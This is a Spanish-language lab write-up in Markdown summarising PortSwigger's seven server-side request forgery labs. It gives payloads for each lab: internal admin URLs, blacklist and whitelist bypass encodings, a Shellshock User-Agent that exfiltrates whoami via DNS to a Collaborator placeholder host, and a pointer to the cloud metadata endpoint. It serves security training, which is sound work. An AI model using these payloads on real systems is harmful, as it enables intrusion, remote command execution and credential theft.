---
aliases:
  - SSRF labs
  - ssrf-labs
tags:
  - vuln/ssrf
  - labs
  - portswigger
---

# SSRF — Labs de PortSwigger

Labs de la categoría **[Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)**: **2 Apprentice + 3 Practitioner + 2 Expert** (7 en total). **El hilo común:** una feature del server hace una **petición HTTP del lado servidor** a una URL que vos influís → la redirigís a un **recurso interno** (`localhost`, `127.0.0.1`, `192.168.0.X`, `169.254.169.254`) al que no deberías llegar. Lo que cambia lab a lab: **por dónde entra la URL** (parámetro directo `stockApi` vs. **Referer** que lee el analytics) y **qué filtro tenés que saltar** (nada → blacklist → whitelist → o esquivándolo con un **open redirect**).

> [!note] Dos superficies, dos "sabores" de SSRF
> - **SSRF directo (in-band):** controlás la URL en un parámetro (`stockApi`) y **ves la respuesta** → apuntás al admin y actuás. Labs 1, 2, 4, 5, 7.
> - **SSRF ciego (blind):** la petición la dispara algo que **no te devuelve el resultado** (el **analytics lee el `Referer`**) → necesitás **Burp Collaborator** para confirmar/exfiltrar out-of-band. Labs 3, 6.

> **Cómo leer las columnas:** **Feature vulnerable** = por dónde entra la URL (dónde inyectás) · **Técnica · qué necesitás** = el truco (bypass de filtro / redirect / OOB) + herramientas externas (Collaborator) · **Objetivo** = qué conseguís. Payloads completos → sección [Payloads por lab](#payloads-por-lab). Metodología y detección → [[vulnerabilities/007-ssrf/ssrf|entry point]].

## Apprentice

| # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 1 | [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost) | **"Check stock"** manda `stockApi=<URL>` | **SSRF directo, sin filtro:** cambiás la URL por `http://localhost/admin`. Nada externo. | Entrar al **panel admin** en `http://localhost/admin` → **borrar a `carlos`**. |
| 2 | [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system) | **"Check stock"** (`stockApi`) | **Escaneo de red interna:** iterás `http://192.168.0.X:8080/admin` (X = 1-255) hasta encontrar el admin. Burp **Intruder**. | Encontrar el admin interno en **`192.168.0.X:8080`** → **borrar a `carlos`**. |

## Practitioner

| # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 3 | [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection) | **`Referer` header** — lo lee el **analytics** al cargar un producto (la respuesta **no refleja** nada → blind) | **OOB con Collaborator:** ponés tu subdominio de Collaborator en el `Referer` y ves si llega la interacción. Necesitás **Burp Collaborator**. | Provocar una **petición HTTP** al Collaborator (probar que existe el SSRF ciego). |
| 4 | [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter) | **"Check stock"** (`stockApi`) con **blacklist** | **Bypass de blacklist:** bloquea `localhost`/`127.0.0.1` y la palabra `admin`. Saltás con IP alternativa (`127.1`) + **doble URL-encode** de una letra de `admin` (`a`→`%2561`). | Llegar a `http://127.1/%2561dmin` → **borrar a `carlos`**. |
| 5 | [SSRF with filter bypass via open redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection) | **"Check stock"** (whitelist) **+ open redirect** en `nextProduct?path=` | **Encadenar 2 vulns:** el `stockApi` solo acepta el propio dominio, pero apuntás al endpoint con **open redirect**, que reenvía a la URL interna. | Vía redirect llegar a `http://192.168.0.12:8080/admin` → **borrar a `carlos`**. |

## Expert

| # | Laboratorio | Feature vulnerable (entry point) | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 6 | [Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation) | **`Referer` header** (blind, mismo analytics que el lab 3) | **SSRF ciego → RCE (Shellshock):** escaneás `192.168.0.X:8080` por `Referer` y metés el payload **Shellshock** en el `User-Agent`; el server interno vulnerable ejecuta y exfiltra por **DNS**. Necesitás **Collaborator** + **Intruder**. | Exfiltrar el **nombre del usuario del SO** del server interno vía Collaborator. |
| 7 | [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter) | **"Check stock"** (`stockApi`) con **whitelist** | **Bypass de whitelist con credenciales embebidas:** solo acepta `stock.weliketoshop.net`. Usás `usuario@host` + `#` **doble-encodeado** (`%2523`) para que el parser valide el dominio permitido pero **conecte a `localhost`**. | Llegar a `http://localhost/admin` esquivando la whitelist → **borrar a `carlos`**. |

---

## Payloads por lab

> Todo va en el parámetro **`stockApi`** de `POST /product/stock` (salvo los blind, que van en el **`Referer`**). Reemplazá `COLLAB` por tu subdominio de Collaborator. El **borrado de carlos** casi siempre es `GET /admin/delete?username=carlos` (o el botón "Delete" del panel, que arma esa URL).

**L1 — SSRF al propio server (localhost):**
```
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
```

**L2 — SSRF a otro back-end (escanear red interna):**
```
stockApi=http://192.168.0.1:8080/admin      ← Intruder sobre el último octeto (1-255)
stockApi=http://192.168.0.X:8080/admin/delete?username=carlos   ← con la IP que dio 200
```

**L3 — Blind SSRF, detección OOB (va en el Referer):**
```
Referer: http://TU-SUBDOMINIO.COLLAB
```
> Cargá una página de producto con ese `Referer` y hacé **Poll now** en Collaborator: si hay DNS/HTTP, hay SSRF ciego.

**L4 — Bypass de blacklist:**
```
stockApi=http://127.1/%2561dmin                          ← 'admin' filtrado → 'a'=%2561
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
> `localhost`/`127.0.0.1` filtrados → `127.1`. La palabra `admin` filtrada → doble-encode una letra (`%2561` = `a`). A veces hace falta encoding extra hasta que pasa.

**L5 — Bypass vía open redirection:**
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
> El `stockApi` acepta rutas del propio sitio; `nextProduct` redirige a la URL de `path`, y el stock-checker **sigue el redirect** hasta el host interno.

**L6 — Blind SSRF + Shellshock (Referer + User-Agent):**
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).TU-SUBDOMINIO.COLLAB
Referer: http://192.168.0.X:8080
```
> Con **Intruder** iterás el último octeto en el `Referer`. Cuando el `Referer` pega en el server interno vulnerable a Shellshock, el `User-Agent` se ejecuta → `nslookup` filtra `$(whoami)` en el **subdominio DNS** del Collaborator. Leelo en las interacciones.

**L7 — Bypass de whitelist (credenciales embebidas + `#` doble-encode):**
```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
> `%2523` = `%23` = `#`. Al parser de validación le parece que el host es `stock.weliketoshop.net` (whitelisted), pero al resolver la conexión el host real es `localhost` y el resto queda como fragmento. Escalones previos útiles: `http://username@stock.weliketoshop.net/`, `http://localhost@stock.weliketoshop.net/`.

---

## Atajos mentales / patrones

- **La pista de que hay SSRF:** un parámetro que contiene una **URL/host completo** (`stockApi`, `url`, `path`, `dest`, `feed`, `callback`, previews de link, webhooks, importadores). Si el server va a **buscar** esa URL, probá redirigirla adentro.
- **Objetivos internos típicos:** `http://localhost/admin` (el propio server) · `http://192.168.0.X:8080/` (otro back-end, **escanealo con Intruder**) · `http://169.254.169.254/` (**metadata cloud**, credenciales — clásico de [[vulnerabilities/006-xxe/xxe|XXE→SSRF]]) · `file:///…` si el fetcher acepta el esquema.
- **Directo vs ciego:** si **ves la respuesta** del fetch → directo (apuntá al admin y listo). Si **no vuelve nada** pero algo hace la request (analytics leyendo el `Referer`) → **ciego** → **Collaborator** para confirmar (L3) o exfiltrar (L6).
- **Escalera de filtros** (dificultad creciente):
  - **Sin filtro** (L1, L2) → apuntás derecho.
  - **Blacklist** (L4) → `127.1`, `0`, IP en decimal/octal/hex, `[::]`, mayúsculas mezcladas, **doble URL-encode** de caracteres clave.
  - **Whitelist** (L7) → credenciales embebidas `user@`, `#`/`?` para cortar el host, `#` doble-encodeado, a veces sub-dominios (`localhost.stock.weliketoshop.net`).
  - **Open redirect** (L5) → si no podés falsear el host, dejá que **otra feature del sitio** redirija por vos.
- **Ciego + querés impacto real:** buscá un servicio interno **vulnerable** al que llegar por SSRF (Shellshock en L6) → SSRF ciego se convierte en **RCE**.
- **Borrar carlos:** el objetivo de casi todos es `/admin/delete?username=carlos` — acordate de **agregar la ruta de borrado** a la URL interna una vez que confirmás acceso al panel.

> [!note] Ver también
> - **Entry point** (detección, árbol de decisión, plantillas) → [[vulnerabilities/007-ssrf/ssrf|ssrf]]
> - **XXE → SSRF** (la entidad apunta a una URL interna / metadata) → [[vulnerabilities/006-xxe/examples/002-xxe-a-ssrf-metadata-cloud|XXE ejemplo 002]]
> - **Open redirection** — el pivote del lab 5 (feature de redirect abierta como escalón)
